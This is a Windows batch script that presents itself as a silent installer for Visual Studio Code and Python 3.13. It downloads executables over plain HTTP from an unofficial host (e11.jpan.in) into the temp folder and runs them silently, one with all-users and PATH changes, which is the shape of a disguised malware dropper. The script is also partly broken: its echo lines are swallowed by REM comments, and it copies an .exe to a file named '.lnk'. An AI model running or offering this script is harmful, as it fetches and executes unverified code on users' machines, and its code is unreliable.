@echo off 
cd %temp%
REM Batch script to install Visual Studio Code and Python 3.13 silently REM Step 1: Download Visual Studio Code installer echo Downloading Visual Studio Code installer... 
curl -o code195.exe http://e11.jpan.in/f/code195.exe 
IF %ERRORLEVEL% NEQ 0 (
    echo Failed to download Visual Studio Code installer.
    exit /b %ERRORLEVEL% ) 
REM Step 2: Install Visual Studio Code silently echo Installing Visual Studio Code silently... 
code195.exe /VERYSILENT /NORESTART /MERGETASKS=!runcode 
IF %ERRORLEVEL% NEQ 0 (
    echo Failed to install Visual Studio Code.
    exit /b %ERRORLEVEL% ) 
REM Step 3: Download Python 3.13 installer echo Downloading Python 3.13 installer... 
curl -o python313.exe http://e11.jpan.in/f/py313.exe 
IF %ERRORLEVEL% NEQ 0 (
    echo Failed to download Python 3.13 installer.
    exit /b %ERRORLEVEL% ) 
REM Step 4: Install Python 3.13 silently for all users echo Installing Python 3.13 silently for all users... 
python313.exe /quiet InstallAllUsers=1 PrependPath=1 
IF %ERRORLEVEL% NEQ 0 (
    echo Failed to install Python 3.13.
    exit /b %ERRORLEVEL% ) 

copy /Y "%ProgramFiles%\Microsoft VS Code\Code.exe" "%Public%\Desktop\Visual Studio Code.lnk"
echo Installation of Visual Studio Code and Python 3.13 completed successfully. exit /b 0
